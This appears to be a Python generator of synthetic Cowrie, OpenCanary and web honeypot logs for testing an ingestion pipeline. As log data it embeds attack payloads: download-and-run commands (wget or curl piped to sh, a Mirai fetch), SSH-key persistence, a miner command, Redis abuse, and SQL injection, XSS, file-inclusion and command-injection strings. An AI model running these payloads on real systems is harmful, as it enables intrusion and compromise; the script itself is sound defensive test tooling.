#!/usr/bin/env python3
"""Generador de logs sintéticos para el módulo C (pipeline).

Produce, en formato NATIVO de Cowrie, NATIVO de OpenCanary y esquema común web,
varios días de actividad realista:

    <out>/cowrie/cowrie.json
    <out>/opencanary/opencanary.log
    <out>/web/web.jsonl
    <out>/manifest.json      (recuentos esperados, usados por tests/e2e_check.sh)

Uso:
    python3 tools/generate_sample_data.py                       # 6000 eventos, 7 días
    python3 tools/generate_sample_data.py --events 20000 --days 14 --seed 7

Solo usa la biblioteca estándar (Python 3.12). Las IPs son públicas aleatorias
(no corresponden a ningún atacante real) y los hashes/ficheros son ficticios.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# --------------------------------------------------------------------------- #
# Datos de apoyo
# --------------------------------------------------------------------------- #
PUBLIC_FIRST_OCTETS = [
    5, 14, 27, 31, 37, 41, 45, 46, 58, 59, 60, 61, 77, 78, 80, 82, 85, 89, 91, 92, 94,
    101, 103, 106, 109, 111, 113, 114, 115, 117, 118, 119, 120, 121, 122, 123, 125, 134,
    139, 141, 146, 150, 152, 154, 156, 159, 167, 170, 175, 176, 177, 178, 179, 180, 181,
    182, 183, 185, 186, 187, 188, 189, 190, 191, 193, 194, 195, 196, 197, 198, 200, 201,
    202, 210, 211, 212, 213, 217, 218, 219, 220, 221, 222,
]
HOUR_WEIGHTS = [5, 6, 7, 8, 8, 7, 6, 5, 4, 4, 4, 4, 5, 5, 5, 6, 6, 5, 4, 4, 4, 4, 5, 5]

SSH_USERS = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres", "pi", "git",
             "ftpuser", "support", "debian", "guest", "ec2-user", "hadoop", "jenkins"]
SSH_PASSWORDS = ["123456", "admin", "password", "root", "1234", "12345", "qwerty", "toor",
                 "raspberry", "ubnt", "default", "P@ssw0rd", "letmein", "changeme", "test123",
                 "admin123", "welcome", "1q2w3e4r", "passw0rd", "123123"]
TELNET_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"),
                ("root", "default"), ("support", "support"), ("root", "juantech"),
                ("admin", "1234"), ("root", "12345"), ("guest", "guest"), ("root", "")]
RECON_CMDS = ["uname -a", "whoami", "id", "w", "ls -la", "cat /etc/passwd", "free -m", "lscpu",
              "uptime", "cat /etc/issue", "ps aux", "netstat -tulpn", "nproc",
              "cat /proc/cpuinfo | grep name | wc -l", "ifconfig", "df -h"]
PERSIST_CMDS = [
    'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 mdrfckr" >> ~/.ssh/authorized_keys',
    "cd ~ && rm -rf .ssh && mkdir .ssh && chmod 700 .ssh", "crontab -l",
    "chattr -ia .ssh; lockr -ia .ssh",
]
MINER_CMDS = ["ps | grep -i miner", "./xmrig -o pool.minexmr.com:4444 -u WALLET -p x",
              "cat /proc/cpuinfo | grep -c processor"]
REDIS_CMDS = [("INFO", ""), ("KEYS", "*"), ("CONFIG", "SET dir /root/.ssh"),
              ("CONFIG", "SET dbfilename authorized_keys"), ("FLUSHALL", ""),
              ("SLAVEOF", "{ip} 6379"), ("CONFIG", "GET *"), ("SET", "crackit x"), ("SAVE", "")]
WEB_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "curl/7.68.0", "python-requests/2.31.0", "Go-http-client/1.1",
]
SCANNER_UAS = ["Mozilla/5.00 (Nikto/2.1.6)", "zgrab/0.x", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
               "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
               "Mozilla/5.0 zgrab/0.x", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"]
SCAN_PATHS = ["/wp-login.php", "/.env", "/phpmyadmin/", "/admin", "/.git/config", "/xmlrpc.php",
              "/server-status", "/actuator/health", "/cgi-bin/", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
              "/manager/html", "/config.php", "/boaform/admin/formLogin", "/HNAP1/", "/backup.zip", "/solr/admin/info/system"]
NORMAL_PATHS = ["/", "/", "/login", "/about", "/products?id=3", "/products?id=7", "/contact", "/search?q=laptop"]
SQLI_PAYLOADS = ["1' OR 1=1--", "' UNION SELECT username,password FROM users--", "admin'--",
                 "1; DROP TABLE users;--", "1' AND SLEEP(5)--", "' OR '1'='1", "1 UNION ALL SELECT NULL,version()--",
                 "1' AND extractvalue(1,concat(0x7e,database()))--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(document.cookie)>",
                "<svg/onload=alert('xss')>", "javascript:alert(1)", "<iframe src=javascript:alert(1)>"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ", "....//....//....//etc/shadow"]
CMDI_PAYLOADS = ["127.0.0.1;cat /etc/passwd", "127.0.0.1 && whoami", "`id`", "$(uname -a)",
                 "127.0.0.1|ls -la", "8.8.8.8; wget http://{ip}/x.sh -O- | sh"]


# --------------------------------------------------------------------------- #
# Utilidades
# --------------------------------------------------------------------------- #
class Gen:
    """Contexto de generación (RNG, IPs, ventana temporal)."""

    def __init__(self, seed: int, days: int, n_ips: int) -> None:
        self.rng = random.Random(seed)
        self.end = datetime.now(timezone.utc).replace(microsecond=0) - timedelta(minutes=5)
        self.start = self.end - timedelta(days=days)
        self.ips = [self.rand_ip() for _ in range(n_ips)]
        # Distribución tipo Zipf: pocas IPs muy activas, cola larga
        self.ip_w = [1.0 / (i + 1) ** 1.05 for i in range(n_ips)]

    def rand_ip(self) -> str:
        r = self.rng
        return f"{r.choice(PUBLIC_FIRST_OCTETS)}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}"

    def attacker(self) -> str:
        return self.rng.choices(self.ips, self.ip_w)[0]

    def rand_time(self) -> datetime:
        total = (self.end - self.start).total_seconds() - 900
        while True:
            t = self.start + timedelta(seconds=self.rng.random() * total)
            if self.rng.random() < HOUR_WEIGHTS[t.hour] / 8:
                return t

    def hex(self, n: int) -> str:
        return "".join(self.rng.choice("0123456789abcdef") for _ in range(n))

    def uuid4(self) -> str:
        return str(uuid.UUID(int=self.rng.getrandbits(128), version=4))


def iso_us(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"


def iso_ms(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


def oc_time(t: datetime) -> str:
    return t.strftime("%Y-%m-%d %H:%M:%S.%f")


Event = tuple[datetime, dict[str, Any], bool]   # (momento, evento, ¿se indexará?)


# --------------------------------------------------------------------------- #
# Cowrie (SSH / Telnet)
# --------------------------------------------------------------------------- #
def cowrie_session(g: Gen) -> list[Event]:
    r = g.rng
    ip = g.attacker()
    sid = g.hex(12)
    telnet = r.random() < 0.25
    t = g.rand_time()
    t0 = t
    sport = r.randint(1024, 65535)
    out: list[Event] = []

    def base(eventid: str, when: datetime, message: str, **extra: Any) -> dict[str, Any]:
        d: dict[str, Any] = {"eventid": eventid, **extra, "message": message,
                             "sensor": "hp-cowrie", "timestamp": iso_us(when),
                             "src_ip": ip, "session": sid}
        return d

    out.append((t, {
        "eventid": "cowrie.session.connect", "src_ip": ip, "src_port": sport, "dst_ip": "172.30.0.10",
        "dst_port": 2223 if telnet else 2222, "session": sid, "protocol": "telnet" if telnet else "ssh",
        "message": f"New connection: {ip}:{sport} (172.30.0.10:{2223 if telnet else 2222}) [session: {sid}]",
        "sensor": "hp-cowrie", "timestamp": iso_us(t)}, True))
    if not telnet:
        t += timedelta(seconds=r.uniform(0.1, 0.6))
        out.append((t, base("cowrie.client.version", t, "Remote SSH version: SSH-2.0-libssh_0.9.6",
                            version="SSH-2.0-libssh_0.9.6"), False))
        t += timedelta(seconds=r.uniform(0.1, 0.5))
        out.append((t, base("cowrie.client.kex", t, "SSH client hassh fingerprint", hassh=g.hex(32)), False))

    # ¿solo escaneo (sin autenticar)?
    if r.random() < 0.18:
        t += timedelta(seconds=r.uniform(0.3, 4))
        out.append((t, base("cowrie.session.closed", t, "Connection lost", duration=round((t - t0).total_seconds(), 1)), True))
        return out

    n_fail = r.randint(1, 9)
    succeeded = r.random() < 0.4
    attempts = n_fail + (1 if succeeded else 0)
    for i in range(attempts):
        t += timedelta(seconds=r.uniform(0.4, 3.5))
        if telnet:
            user, pwd = r.choice(TELNET_CREDS)
        else:
            user, pwd = r.choice(SSH_USERS), r.choice(SSH_PASSWORDS)
        ok = succeeded and i == attempts - 1
        out.append((t, base("cowrie.login.success" if ok else "cowrie.login.failed", t,
                            f"login attempt [{user}/{pwd}] {'succeeded' if ok else 'failed'}",
                            username=user, password=pwd), True))

    if succeeded:
        scenario = r.choice(["recon", "malware", "persist", "miner", "recon"])
        cmds: list[str] = []
        mal_ip = g.rand_ip()
        if scenario == "recon":
            cmds = r.sample(RECON_CMDS, r.randint(2, 6))
        elif scenario == "malware":
            cmds = r.sample(RECON_CMDS, 2) + r.choice([
                [f"cd /tmp; wget http://{mal_ip}/bins.sh; chmod +x bins.sh; sh bins.sh"],
                [f"curl -s -O http://{mal_ip}/x86_64 && chmod 777 x86_64 && ./x86_64"],
                [f"tftp -g -r mirai.arm {mal_ip}", "chmod +x mirai.arm", "./mirai.arm"],
                [f"busybox wget http://{mal_ip}/a.sh -O- | sh"],
            ])
        elif scenario == "persist":
            cmds = r.sample(RECON_CMDS, 2) + r.sample(PERSIST_CMDS, r.randint(1, 3))
        else:
            cmds = r.sample(RECON_CMDS, 2) + r.sample(MINER_CMDS, 2)
        for c in cmds:
            t += timedelta(seconds=r.uniform(0.8, 9))
            out.append((t, base("cowrie.command.input", t, f"CMD: {c}", input=c), True))
            if "wget " in c or "curl " in c or c.startswith("tftp"):
                if c.startswith("tftp"):
                    url = f"tftp://{mal_ip}/mirai.arm"
                else:
                    url = f"http://{mal_ip}/{c.split('/')[-1].split(' ')[0].split(';')[0] or 'bins.sh'}"
                sha = hashlib.sha256(url.encode()).hexdigest()
                t += timedelta(seconds=r.uniform(0.5, 3))
                out.append((t, base("cowrie.session.file_download", t,
                                    f"Downloaded URL ({url}) with SHA-256 {sha}",
                                    url=url, outfile=f"var/lib/cowrie/downloads/{sha[:16]}", shasum=sha), True))
        if r.random() < 0.05:
            t += timedelta(seconds=r.uniform(1, 5))
            sha = g.hex(64)
            out.append((t, base("cowrie.session.file_upload", t, f"SFTP upload to /tmp/payload.bin ({sha})",
                                filename="payload.bin", outfile=f"var/lib/cowrie/downloads/{sha[:16]}", shasum=sha), True))

    t += timedelta(seconds=r.uniform(0.5, 20))
    out.append((t, base("cowrie.session.closed", t, "Connection lost",
                        duration=round((t - t0).total_seconds(), 1)), True))
    return out


# --------------------------------------------------------------------------- #
# OpenCanary (FTP / MySQL / Redis)
# --------------------------------------------------------------------------- #
def opencanary_session(g: Gen) -> list[Event]:
    r = g.rng
    ip = g.attacker()
    t = g.rand_time()
    sport = r.randint(1024, 65535)
    svc = r.choices(["ftp", "mysql", "redis"], [4, 3, 3])[0]
    out: list[Event] = []

    def ev(logtype: int, dport: int, logdata: dict[str, Any], when: datetime) -> dict[str, Any]:
        return {"dst_host": "172.30.0.20", "dst_port": dport, "local_time": oc_time(when),
                "local_time_adjusted": oc_time(when), "logdata": logdata, "logtype": logtype,
                "node_id": "hp-opencanary", "src_host": ip, "src_port": sport, "utc_time": oc_time(when)}

    if svc == "ftp":
        for _ in range(r.randint(1, 6)):
            t += timedelta(seconds=r.uniform(0.5, 4))
            out.append((t, ev(2000, 21, {"PASSWORD": r.choice(SSH_PASSWORDS), "USERNAME": r.choice(["anonymous", "ftp", "admin", "root", "ftpuser", "test"])}, t), True))
    elif svc == "mysql":
        for _ in range(r.randint(1, 4)):
            t += timedelta(seconds=r.uniform(0.5, 4))
            out.append((t, ev(8001, 3306, {"PASSWORD": g.hex(32), "USERNAME": r.choice(["root", "admin", "mysql", "wordpress", "dbuser"])}, t), True))
    else:
        for _ in range(r.randint(1, 5)):
            t += timedelta(seconds=r.uniform(0.3, 3))
            cmd, args = r.choice(REDIS_CMDS)
            out.append((t, ev(17001, 6379, {"CMD": cmd, "ARGS": args.format(ip=g.rand_ip())}, t), True))
    return out


# --------------------------------------------------------------------------- #
# Web señuelo (esquema común directo)
# --------------------------------------------------------------------------- #
def web_events(g: Gen) -> list[Event]:
    r = g.rng
    ip = g.attacker()
    t = g.rand_time()
    sport = r.randint(1024, 65535)
    sid = hashlib.sha1(f"{ip}{t.date()}".encode()).hexdigest()[:12]
    kind = r.choices(["normal", "scan", "sqli", "xss", "lfi", "cmdi", "login", "upload", "scanner_ua"],
                     [14, 18, 14, 8, 8, 6, 20, 4, 8])[0]
    out: list[Event] = []

    def req(path: str, query: str | None, ua: str, method: str = "GET", status: int = 200,
            et: str = "request", body: str | None = None, when: datetime | None = None,
            **extra: Any) -> None:
        when = when or t
        http: dict[str, Any] = {"method": method, "path": path, "headers": {"host": "localhost:8080"},
                                "user_agent": ua, "status": status}
        if query:
            http["query"] = query
        if body:
            http["body"] = body
        ev: dict[str, Any] = {"@timestamp": iso_ms(when), "event_id": g.uuid4(), "honeypot": "web", "service": "http",
                              "event_type": et, "src_ip": ip, "src_port": sport, "dst_port": 8080,
                              "session_id": sid, "http": http}
        ev.update(extra)
        out.append((when, ev, True))

    ua = r.choice(WEB_UAS)
    if kind == "normal":
        for _ in range(r.randint(1, 4)):
            p = r.choice(NORMAL_PATHS)
            path, _, q = p.partition("?")
            req(path, q or None, ua)
    elif kind == "scan":
        for _ in range(r.randint(2, 8)):
            req(r.choice(SCAN_PATHS), None, ua, status=404)
    elif kind == "scanner_ua":
        sua = r.choice(SCANNER_UAS)
        for _ in range(r.randint(1, 5)):
            req(r.choice(["/", "/index.php", "/robots.txt", "/login"]), None, sua, status=r.choice([200, 404]))
    elif kind == "sqli":
        sua = "sqlmap/1.7.2#stable (https://sqlmap.org)" if r.random() < 0.3 else ua
        for _ in range(r.randint(1, 4)):
            payload = r.choice(SQLI_PAYLOADS)
            req(r.choice(["/search", "/products", "/item"]), f"q={payload}" if r.random() < 0.7 else f"id={payload}", sua, status=r.choice([200, 500]))
    elif kind == "xss":
        for _ in range(r.randint(1, 3)):
            req(r.choice(["/search", "/contact", "/comment"]), f"q={r.choice(XSS_PAYLOADS)}", ua)
    elif kind == "lfi":
        for _ in range(r.randint(1, 3)):
            req(r.choice(["/download", "/view", "/index.php"]), f"file={r.choice(LFI_PAYLOADS)}", ua, status=r.choice([200, 404]))
    elif kind == "cmdi":
        for _ in range(r.randint(1, 3)):
            req("/ping", "host=" + r.choice(CMDI_PAYLOADS).format(ip=g.rand_ip()), ua)
    elif kind == "login":
        for _ in range(r.randint(1, 8)):
            t += timedelta(seconds=r.uniform(0.3, 3))
            user, pwd = r.choice(SSH_USERS), r.choice(SSH_PASSWORDS)
            req("/login", None, ua, method="POST", status=401, et="auth_attempt",
                body=f"username={user}&password={pwd}", when=t,
                auth={"username": user, "password": pwd, "success": False})
    elif kind == "upload":
        name = r.choice(["shell.php", "c99.php", "cmd.jsp", "x.phtml", "backdoor.asp"])
        size = r.randint(300, 40000)
        req("/upload", None, ua, method="POST", et="file_upload",
            file={"name": name, "sha256": hashlib.sha256(f"{name}{size}{ip}".encode()).hexdigest(), "size": size, "url": None})
    return out


# --------------------------------------------------------------------------- #
# Ruido y líneas corruptas
# --------------------------------------------------------------------------- #
def corrupt_lines(g: Gen) -> dict[str, list[str]]:
    ts = iso_us(g.end - timedelta(hours=1))
    return {
        "cowrie": [
            '{"eventid": "cowrie.login.failed", "src_ip": "45.12.',                   # JSON truncado
            "Traceback (most recent call last): ValueError: boom",                    # texto plano
            json.dumps({"eventid": "cowrie.login.failed", "username": "root", "password": "x",  # IP inválida
                        "message": "login attempt [root/x] failed", "sensor": "hp-cowrie",
                        "timestamp": ts, "src_ip": "999.999.1.1", "session": "bad000000001"}),
        ],
        "opencanary": ["[1, 2, 3]", '{"logtype": 2000, "src_host": "1.2.3'],
        "web": ['{"@timestamp": "2026-01-01T00:00:00.000Z", "event_id": "x", "http": {"path"', "null"],
    }


def opencanary_boot(g: Gen) -> list[Event]:
    t = g.start + timedelta(seconds=3)
    d = {"dst_host": "", "dst_port": -1, "local_time": oc_time(t), "local_time_adjusted": oc_time(t),
         "logdata": {"msg": {"logdata": "Added service from class OpenCanary.modules.ftp.CanaryFTP in OpenCanary.modules.ftp to fake"}},
         "logtype": 1001, "node_id": "hp-opencanary", "src_host": "", "src_port": -1, "utc_time": oc_time(t)}
    return [(t, d, False)]


# --------------------------------------------------------------------------- #
# Programa principal
# --------------------------------------------------------------------------- #
def write_jsonl(path: Path, rows: list[tuple[datetime, str]], extra_lines: list[str], rng: random.Random) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    rows.sort(key=lambda x: x[0])
    lines = [ln for _, ln in rows]
    for bad in extra_lines:                      # intercala las líneas corruptas
        lines.insert(rng.randint(1, max(1, len(lines) - 1)), bad)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return len(lines)


def main() -> None:
    ap = argparse.ArgumentParser(description="Genera logs sintéticos de honeypots (Cowrie, OpenCanary, web).")
    ap.add_argument("--events", type=int, default=6000, help="eventos que se indexarán (mínimo; defecto 6000)")
    ap.add_argument("--days", type=int, default=7, help="días de actividad (defecto 7)")
    ap.add_argument("--ips", type=int, default=90, help="IPs atacantes distintas (defecto 90)")
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", type=Path, default=Path("sample-logs"))
    args = ap.parse_args()

    g = Gen(args.seed, args.days, args.ips)
    rows: dict[str, list[tuple[datetime, str]]] = {"cowrie": [], "opencanary": [], "web": []}
    mapped = {"cowrie": 0, "opencanary": 0, "web": 0}
    ignored = 0

    def add(key: str, evs: list[Event]) -> None:
        nonlocal ignored
        for when, ev, indexed in evs:
            rows[key].append((when, json.dumps(ev, ensure_ascii=False, separators=(",", ":"))))
            if indexed:
                mapped[key] += 1
            else:
                ignored += 1

    add("opencanary", opencanary_boot(g))
    while sum(mapped.values()) < args.events:
        key = g.rng.choices(["cowrie", "opencanary", "web"], [45, 20, 35])[0]
        add(key, {"cowrie": cowrie_session, "opencanary": opencanary_session, "web": web_events}[key](g))

    bad = corrupt_lines(g)
    out = args.out
    total_lines = {
        "cowrie": write_jsonl(out / "cowrie" / "cowrie.json", rows["cowrie"], bad["cowrie"], g.rng),
        "opencanary": write_jsonl(out / "opencanary" / "opencanary.log", rows["opencanary"], bad["opencanary"], g.rng),
        "web": write_jsonl(out / "web" / "web.jsonl", rows["web"], bad["web"], g.rng),
    }
    manifest = {
        "generated_at": iso_ms(datetime.now(timezone.utc)),
        "seed": args.seed,
        "days": args.days,
        "total_lines": sum(total_lines.values()),
        "lines_per_file": total_lines,
        "expected_indexed": sum(mapped.values()),
        "expected_indexed_per_honeypot": mapped,
        "ignored_lines": ignored,
        "corrupt_lines": sum(len(v) for v in bad.values()),
    }
    (out / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
